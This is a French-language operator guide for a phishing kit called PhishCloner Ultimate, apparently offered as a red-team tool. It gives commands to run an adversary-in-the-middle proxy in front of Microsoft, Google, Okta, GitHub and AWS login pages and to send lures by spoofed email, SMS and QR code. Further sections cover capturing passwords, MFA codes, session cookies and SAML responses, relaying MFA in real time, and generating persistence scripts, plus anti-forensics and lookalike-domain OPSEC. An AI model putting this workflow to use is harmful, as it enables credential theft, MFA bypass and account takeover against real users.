# 🎮 PhishCloner Ultimate v3.0 — Guide d'utilisation

> 20 brands · 9 engines · workflow red team complet.

## 🎯 Premier lancement

### Python natif
```bash
# Terminal 1 : phish server
python3 engine/mitm_proxy.py --upstream https://login.microsoftonline.com --port 8443

# Terminal 2 : C2 server
python3 engine/cred_validator.py --c2-port 5000

# Terminal 3 : dashboard
python3 -m http.server 8090
# Ouvre http://localhost:8090/c2_admin.html
```

### Docker
```bash
docker-compose up -d
# Dashboard : http://localhost:5000/admin
# Phish : https://localhost:8443
```

## 🧭 Navigation dashboard

### 9 panels (sidebar)
1. **Dashboard** (défaut) — Quick deploy + live capture
2. **Victims** — sessions actives
3. **Credentials** — table capturée
4. **Tokens** — JWT/cookies/bearers exfiltrés
5. **Screenshots** — webcam + desktop snaps
6. **Templates** — 20 brands cliquables
7. **C2 Server** — engine status + 9 modules
8. **Live Stream** — engine event log
9. **Report** — export JSON/HTML

### Raccourcis
| Touche | Action |
|--------|--------|
| `1-9` | Switch panel |
| `D` | Open dashboard |
| `V` | Open victims |
| `C` | Open credentials |
| `T` | Open tokens |
| `E` | Export report |
| `?` | Help |

## ⚡ Workflow red team complet

### Étape 1 — Configuration

Dashboard → onglet **Dashboard** :

```
Target URL : https://login.microsoftonline.com/
Brand      : microsoft
LHOST      : 0.0.0.0
LPORT      : 8443

→ DEPLOY
```

Le dashboard lance les 9 engines et confirme :
- ✓ TLS Spoofer
- ✓ MITM Proxy
- ✓ MFA Relay
- ✓ Exfil queue

### Étape 2 — Delivery

Le serveur phish est live sur `https://0.0.0.0:8443/`. Plusieurs méthodes de delivery :

#### A. Email (via `engine/delivery.py`)
```bash
python3 engine/delivery.py \
  --to target@corp.com \
  --from it-support@corp.com \
  --subject "URGENT: Reset your password" \
  --link https://YOUR_IP:8443/ \
  --smtp smtp.gmail.com
```

#### B. SMS
```bash
python3 engine/delivery.py \
  --sms "+14155552671" \
  --body "Microsoft 365: Verify your account: https://YOUR_IP:8443/" \
  --twilio-sid XXX --twilio-token XXX
```

#### C. QR code
```bash
python3 engine/delivery.py --qr "https://YOUR_IP:8443/" --output qr.png
```

### Étape 3 — Capture

Dashboard → onglet **Victims** :
- IP victime affichée
- UA browser
- Brand ciblé
- Status (HOT = interactif)

Dashboard → onglet **Credentials** :
- Table avec user/pass
- MFA codes si capturés

Dashboard → onglet **Tokens** :
- JWT, cookies, OAuth bearers
- Bouton copy-to-clipboard

### Étape 4 — MFA relay

Dashboard → onglet **C2 Server** → Engine MFA Relay : `on`

Le module `engine/mfa_relay.py` intercepte le code MFA légitime de l'utilisateur et le relaie au serveur upstream en temps réel (<2s).

### Étape 5 — Persistence (optionnel)

Dashboard → onglet **C2 Server** → Action : `GENERATE PERSIST.SH`

Cela crée un script de persistance (cron + init.d) à déployer sur la cible compromise.

### Étape 6 — Report

Dashboard → onglet **Report** → `EXPORT JSON` ou `EXPORT HTML`

Le rapport contient :
- Timestamp
- Operator (ghost1o1)
- Targets
- Brand templates utilisés
- Creds capturées
- Tokens exfiltrés
- Engines utilisés
- Stats mission

## 🎯 Cas d'usage par brand

### Microsoft 365
```
Brand    : microsoft
Upstream : https://login.microsoftonline.com/
Capture  : user/pass + MFA + session cookies (ESTSAUTH)
Exploit  : session hijack via cookies
```

### Google Workspace
```
Brand    : google
Upstream : https://accounts.google.com/
Capture  : user/pass + recovery email
Exploit  : account takeover
```

### Okta SSO
```
Brand    : okta
Upstream : https://YOUR_TENANT.okta.com/
Capture  : SAML response + MFA
Exploit  : SAML replay
```

### GitHub
```
Brand    : github
Upstream : https://github.com/
Capture  : user/pass + 2FA
Exploit  : repo access + PAT
```

### AWS Console
```
Brand    : aws
Upstream : https://console.aws.amazon.com/
Capture  : IAM user/pass + MFA
Exploit  : role assumption
```

## 🛠️ Commandes utiles

### Lancer phish server seul
```bash
python3 engine/mitm_proxy.py \
  --upstream https://login.microsoftonline.com \
  --port 8443 \
  --brand microsoft
```

### Lancer C2 seul
```bash
python3 engine/cred_validator.py --c2-port 5000
```

### Tester capture (dry-run)
```bash
curl -k -X POST https://localhost:8443/login \
  -d 'user=test@corp.com&password=test&mfa=123456'
```

### Tail logs
```bash
tail -f phish_sessions/*.log
tail -f c2_data/*.json
```

### Stats capture
```bash
ls -la phish_sessions/ | wc -l
ls -la phish_exfil/ | wc -l
```

## 🧪 Test rapide (sans cible)

```bash
# 1. Lance phish server
python3 engine/mitm_proxy.py --upstream https://example.com --port 8443

# 2. Test avec curl (ignore cert)
curl -k https://localhost:8443/

# 3. Soumet creds
curl -k -X POST https://localhost:8443/login \
  -d 'username=test&password=12345&mfa=999999'

# 4. Vérifie capture
ls phish_sessions/
cat phish_sessions/*.json
```

## 🔒 OPSEC obligatoire

### Checklist avant mission
- ✅ **Autorisation écrite** signée par le client
- ✅ **Scope** défini (IPs, brands, période)
- ✅ **VPN/Tor** actif avant déploiement
- ✅ **MAC randomisé**
- ✅ **Logs désactivés** sur cible
- ✅ **Backup des creds** chiffré GPG
- ✅ **Cleaner.sh** prêt pour post-mission

### Anti-forensics
- PhishCloner **ne laisse aucune trace** sur la cible
- Captures sont stockées localement (`phish_sessions/`)
- Cleanup script supprime tout après exfil

### OPSEC réseau
- Domaine dédié (ou compromis)
- Cert TLS valide (Let's Encrypt via `engine/tls_spoofer.py --letsencrypt`)
- Cloudflare/CDN devant pour anonymat
- Pas de reverse DNS

## 📚 Exemples de missions

### Mission type 1 : Office 365 audit
```
Brand    : microsoft
Upstream : login.microsoftonline.com
LHOST    : phish.corp-audit.com
LPORT    : 443 (TLS standard)
Delivery : email + SMS
Capture  : user/pass + MFA + cookies
Exploit  : session hijack
Report   : HTML + JSON
```

### Mission type 2 : Google Workspace red team
```
Brand    : google
Upstream : accounts.google.com
LHOST    : secure-login.corp-it.com
LPORT    : 443
Delivery : email
Capture  : user/pass + recovery email
Exploit  : account takeover
Report   : HTML
```

### Mission type 3 : Okta SSO
```
Brand    : okta
Upstream : acme.okta.com
LHOST    : sso.acme.com
LPORT    : 443
Delivery : email
Capture  : SAML + MFA
Exploit  : SAML replay
Report   : HTML + JSON
```

## 🆘 Help

`?` dans dashboard ou `python3 engine/mitm_proxy.py --help`.

---

🏴‍☠️ **ghost1o1** — *"There is no lock."*
